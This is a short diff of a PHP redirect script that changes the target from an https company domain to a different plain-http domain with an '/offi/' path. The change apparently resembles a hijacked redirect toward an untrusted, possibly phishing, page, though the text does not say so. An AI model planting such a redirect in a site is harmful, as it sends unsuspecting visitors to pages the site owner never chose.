@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.jbzinteriors.net");
+header("Location: http://boosterinterior.us/offi/");
 die();
 ?>
